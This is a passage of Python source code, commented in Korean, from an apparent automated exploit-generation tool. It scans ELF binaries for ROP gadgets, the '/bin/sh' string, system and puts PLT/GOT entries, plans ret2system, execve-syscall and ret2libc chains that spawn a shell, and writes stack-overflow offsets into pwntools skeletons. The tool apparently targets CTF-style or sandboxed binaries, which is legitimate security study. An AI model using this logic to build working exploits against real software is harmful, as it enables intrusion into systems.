        start, end = section.addr, section.addr + section.size
        lo = start if lo is None else min(lo, start)
        hi = end if hi is None else max(hi, end)
    if lo is None or hi is None:
        return None
    return (lo, hi)


def find_binsh(image: ElfImage) -> int | None:
    """``/bin/sh`` 문자열의 가상주소를 찾는다(주소 있는 섹션 우선). 없으면 None."""

    needle = b"/bin/sh\x00"
    for section in image.sections:
        if not section.addr or section.size <= 0:
            continue
        blob = image.data[section.offset : section.offset + section.size]
        idx = blob.find(needle)
        if idx != -1:
            return section.addr + idx
    return None


def _system_address(image: ElfImage) -> int | None:
    """system 의 호출 가능 주소(비 PIE): PLT stub 우선, 없으면 정의된 심볼."""

    report = analyze_got_plt(image)
    for entry in report.plt_entries:
        if entry.symbol == "system" and entry.address:
            return entry.address
    sym = image.symbol("system")
    if sym and sym.addr:
        return sym.addr
    return None


def ret2system_plan(image: ElfImage) -> dict | None:
    """amd64 ret2system 체인 구성요소(pop rdi, /bin/sh, system)를 정적으로 수집.

    셋을 모두 non-PIE 절대주소로 찾으면 ``{"pop_rdi", "binsh", "system"}`` 를
    반환한다. 하나라도 없으면 None(작은 바이너리에는 ``pop rdi ; ret`` 가젯이
    없을 수 있음 — 그 경우 자동 구성 불가). 32-bit 는 호출규약이 달라 대상 아님.
    """

    if (image.bits or 64) != 64:
        return None
    pop_rdi = _find_pop_rdi(image)
    binsh = find_binsh(image)
    system = _system_address(image)
    if pop_rdi is None or binsh is None or system is None:
        return None
    return {"pop_rdi": pop_rdi, "binsh": binsh, "system": system}


def execve_plan(image: ElfImage) -> dict | None:
    """amd64 execve("/bin/sh", 0, 0) syscall ROP 체인 구성요소를 정적으로 수집.

    ``system`` 이 링크돼 있지 않은(예: 정적 링크로 unused 심볼이 제거됐거나 애초에
    호출하지 않는) 바이너리를 위한 경로다. 다음을 **모두** non-PIE 절대주소로 찾으면
    ``{"pop_rdi", "pop_rsi", "pop_rdx", "pop_rax", "binsh", "syscall"}`` 를 반환한다:

    - ``pop rdi/rsi/rdx/rax ; ret`` **클린 가젯**(부작용 있는 가젯은 체인을 깨므로 배제,
      :func:`find_clean_pop`)
    - ``/bin/sh`` 문자열(:func:`find_binsh`)
    - ``syscall`` 가젯(:func:`find_syscall_gadget`)

    하나라도 없으면 None. 작은 동적 바이너리에는 ``pop rdx``·``pop rax`` 클린 가젯이
    없는 경우가 많아(그때는 자동 구성 불가) 정적 링크 바이너리에서 주로 성립한다.
    32-bit 은 호출규약(int 0x80)이 달라 대상 아님.
    """

    if (image.bits or 64) != 64:
        return None
    pop_rdi = find_clean_pop(image, "rdi")
    pop_rsi = find_clean_pop(image, "rsi")
    pop_rdx = find_clean_pop(image, "rdx")
    pop_rax = find_clean_pop(image, "rax")
    binsh = find_binsh(image)
    syscall = find_syscall_gadget(image)
    if (
        pop_rdi is None
        or pop_rsi is None
        or pop_rdx is None
        or pop_rax is None
        or binsh is None
        or syscall is None
    ):
        return None
    return {
        "pop_rdi": pop_rdi,
        "pop_rsi": pop_rsi,
        "pop_rdx": pop_rdx,
        "pop_rax": pop_rax,
        "binsh": binsh,
        "syscall": syscall,
    }


def ret2libc_plan(image: ElfImage) -> dict | None:
    """2단계 ret2libc(leak→base→system)의 **바이너리측** 구성요소를 수집(amd64).

    - ``pop_rdi``: 인자 제어 가젯
    - ``puts_plt`` / ``puts_got``: leak 용(puts(puts@got))
    - ``ret``: system 정렬용 ret 가젯
    - ``return_to``: leak 뒤 다시 오버플로 입력을 읽게 만들 재진입 지점
      (``main`` 우선, 없으면 ``vuln``). 비 PIE 절대주소.

    libc 측 오프셋은 :func:`sandbox.libc.resolve_libc_symbols` 가 채운다.
    구성요소가 없으면(예: 스트립되어 재진입 심볼 부재) None.
    """

    if (image.bits or 64) != 64:
        return None
    plt = {entry.symbol: entry for entry in analyze_got_plt(image).plt_entries}
    puts = plt.get("puts")
    pop_rdi = _find_pop_rdi(image)
    ret = find_ret_gadget(image)
    reenter = image.symbol("main") or image.symbol("vuln")
    if (
        pop_rdi is None
        or ret is None
        or puts is None
        or not puts.address
        or not puts.got_address
        or reenter is None
        or not reenter.addr
    ):
        return None
    return {
        "pop_rdi": pop_rdi,
        "puts_plt": puts.address,
        "puts_got": puts.got_address,
        "ret": ret,
        "return_to": reenter.addr,
        "return_to_name": reenter.name,
    }


def find_clean_pop(image: ElfImage, reg: str) -> int | None:
    """``pop <reg> ; ret`` **정확히 2명령**의 클린 가젯 주소(없으면 None).

    체인에 그대로 끼울 수 있으려면 부작용이 없어야 한다: 중간 명령이 다른 인자
    레지스터·메모리·rsp 를 건드리거나 종단이 ``ret imm`` 이면 체인이 어긋난다.
    보수적으로 **순수 2명령 ``pop <reg> ; ret``(클린 ret)** 만 인정하고, 여러 개면
    최저 주소를 고른다(non-PIE 절대주소; 어느 것이든 등가). 클린 가젯이 없으면
    None → 해당 기법을 조용히 깨진 체인으로 시도하지 않고 포기한다.
    """

    first = f"pop {reg.strip().lower()}"
    best: int | None = None
    for gadget in scan_gadgets(image).gadgets:
        body = [t.strip().lower() for t in gadget.instructions]
        if len(body) == 2 and body[0] == first and _is_clean_ret(body[1]):
            if best is None or gadget.address < best:
                best = gadget.address
    return best


def _find_pop_rdi(image: ElfImage) -> int | None:
    """``pop rdi ; ret`` 클린 가젯의 주소(없으면 None)."""

    return find_clean_pop(image, "rdi")


def leak_plan(image: ElfImage) -> dict | None:
    """amd64 puts 기반 libc 주소 leak 체인 구성요소를 정적으로 수집.

    ``puts(puts@got)`` 로 런타임 libc 주소를 출력한 뒤 ``exit`` 로 깨끗이 종료해
    stdio 버퍼를 flush 한다(비대화형 파이프에서 출력을 회수하려면 flush 필수).
    ``{"pop_rdi", "got_target", "puts_plt", "exit_plt"}`` 를 반환하거나, 구성요소가
    없으면 None. 동적 링크(PLT) 바이너리에서만 의미가 있다.
    """

    if (image.bits or 64) != 64:
        return None
    report = analyze_got_plt(image)
    plt = {entry.symbol: entry for entry in report.plt_entries}
    puts = plt.get("puts")
    exit_entry = plt.get("exit")
    pop_rdi = _find_pop_rdi(image)
    if (
        pop_rdi is None
        or puts is None
        or not puts.address
        or not puts.got_address
        or exit_entry is None
        or not exit_entry.address
    ):
        return None
    return {
        "pop_rdi": pop_rdi,
        "got_target": puts.got_address,  # puts@got → 런타임 libc puts 주소
        "puts_plt": puts.address,
        "exit_plt": exit_entry.address,
    }


def inject_confirmed_offset(
    strategy: dict,
    offset: int,
    *,
    method: str | None = None,
    source: str = "dynamic-sandbox",
) -> dict:
    """정적 전략의 pwntools 스켈레톤에 동적으로 확정된 오프셋을 주입한다.

    각 경로의 ``offset = ...`` 라인(스택 오버플로 오프셋)을 확정값으로 교체하고,
    상위 메타데이터에 확정 사실을 기록한다. 포맷스트링 경로의 ``fmt_offset`` 은
    다른 개념이라 건드리지 않는다. 원본 dict 는 변형하지 않고 새 dict 를 반환한다.
    """

    note = f"offset = {offset}  # verified: 동적 샌드박스 확정 (cyclic_find)"
    if method:
        note += f" [method={method}]"

    updated = dict(strategy)
    new_paths: list[dict] = []
    injected_ids: list[str] = []
    for path in strategy.get("paths", []):
        path = dict(path)
        skeleton = path.get("pwntools")
        if isinstance(skeleton, str) and _OFFSET_LINE.search(skeleton):
            path["pwntools"] = _OFFSET_LINE.sub(lambda _m: note, skeleton, count=1)
            path["offset_verified"] = True
            injected_ids.append(path.get("id", ""))
        new_paths.append(path)

    updated["paths"] = new_paths
    updated["confirmed_offset"] = offset
    updated["offset_verification"] = "verified"
    updated["offset_source"] = source
    updated["offset_injected_paths"] = injected_ids
    return updated
